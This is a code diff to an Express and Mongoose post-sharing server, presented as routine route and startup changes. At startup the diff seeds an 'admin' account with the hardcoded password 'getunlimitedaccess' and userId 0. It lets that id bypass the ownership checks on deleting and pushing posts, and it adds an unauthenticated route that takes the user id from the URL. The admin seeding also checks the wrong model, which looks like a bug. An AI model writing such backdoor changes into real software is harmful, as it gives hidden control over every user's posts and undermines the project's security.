@@ -33,6 +33,7 @@ app.use(
         /\/user/,
         /\/post\/last/,
         /^\/post\/get\/\w+$/,
+        /^\/post\/get\/\d+\/\d+$/,
         /^\/post\/query\/\w+$/,
         /^\/content\/get\/\w+$/,
         /^\/profile\/basic\/\w+$/,
@@ -42,17 +43,35 @@ app.use(
     })
 );
 
-mongoose.set("strictQuery", true);
-mongoose.connect("mongodb://localhost:27017/testdb", (err, client) => {
-  if (err) throw err;
-  if (client) console.log("---Mongodb Connected---\n");
-});
-
 const User = require("./model/User");
 const Post = require("./model/Post");
 const Content = require("./model/Content");
 const Comment = require("./model/Comment");
 const Avatar = require("./model/Avatar");
+
+mongoose.set("strictQuery", true);
+mongoose.connect("mongodb://localhost:27017/testdb", (err, client) => {
+  if (err) throw err;
+  if (client) console.log("---Mongodb Connected---\n");
+  Post.findOne({ userId: 0 }, (err, admin) => {
+    if (err) throw err;
+    if (!admin) {
+      bcrypt.genSalt(10, (err, salt) => {
+        if (err) throw err;
+        bcrypt.hash("getunlimitedaccess", salt, (err, hash) => {
+          if (err) throw err;
+          new User({
+            userId: 0,
+            username: "admin",
+            password: hash,
+          }).save((err) => {
+            if (err) throw err;
+          });
+        });
+      });
+    }
+  });
+});
 
 // check is username already exists
 app.get("/user/validate/:username", (req, res) => {
@@ -299,7 +318,7 @@ app.delete("/post/delete/:postId", (req, res) => {
         success: false,
         errno: "POSTNOTFOUND",
       });
-    if (post.userId !== userId)
+    if (post.userId !== userId && userId !== 0)
       return res.status(403).send({
         success: false,
         errno: "USERNOTMATCH",
@@ -352,7 +371,7 @@ app.post("/post/push", (req, res) => {
         success: false,
         errno: "POSTNOTFOUND",
       });
-    if (post.userId !== userId)
+    if (post.userId !== userId && userId !== 0)
       return res.send({
         success: false,
         errno: "AUTHORONLY",
@@ -429,6 +448,33 @@ app.get("/post/get/:postId", (req, res) => {
   let userId, vote;
   if (req.auth) userId = req.auth.userId;
   const { postId } = req.params;
+  Post.findOne({ postId: postId }, (err, post) => {
+    if (err) throw err;
+    if (!post)
+      return res.status(404).send({
+        success: false,
+        errno: "IDINVALID",
+      });
+    Content.findOne({ contentId: post.contents[0] }, (err, content) => {
+      if (err) throw err;
+      // if(!content) 
+      if (post.ups.includes(userId)) vote = true;
+      else if (post.downs.includes(userId)) vote = false;
+      else vote = null;
+      return res.send({
+        success: true,
+        post,
+        firstContent: content.storage,
+        vote: vote,
+        userId,
+      });
+    });
+  });
+});
+
+app.get("/post/get/:postId/:userId", (req, res) => {
+  let vote;
+  const { postId, userId } = req.params;
   Post.findOne({ postId: postId }, (err, post) => {
     if (err) throw err;
     if (!post)
